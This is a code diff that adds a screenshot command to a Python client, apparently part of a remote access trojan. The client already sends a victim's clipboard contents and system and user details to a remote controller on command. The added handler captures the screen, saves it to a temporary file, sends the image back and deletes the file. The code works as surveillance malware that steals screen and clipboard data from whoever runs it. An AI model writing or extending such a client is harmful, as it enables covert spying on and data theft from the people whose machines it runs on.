@@ -8,6 +8,7 @@ import time
 
 import psutil
 import pyperclip
+import pyscreenshot
 from cryptography.fernet import Fernet
 from cryptography.hazmat.backends import default_backend
 from cryptography.hazmat.primitives import hashes, serialization
@@ -193,6 +194,17 @@ class Client(object):
                 self.send('User: {}\nOS: {} {} ({})\n'.format(os.environ['USERNAME'], platform.system(), platform.release(), platform.platform()).encode())
                 continue
 
+            if data == b'<SCREENSHOT>':
+                pic = pyscreenshot.grab('temp.png')
+                if platform.system() == 'Windows':
+                    _file = '{}\\temp.png'.format(os.environ['TEMP'])
+                else:
+                    _file = '{}/temp.png'.format(os.environ['HOME'])
+                pic.save(_file)
+                with open(_file, 'rb') as f:
+                    self.send(f.read())
+                os.remove(_file)
+                continue
 
             if data == b'<PASTE>':
                 self.send(pyperclip.paste().encode())
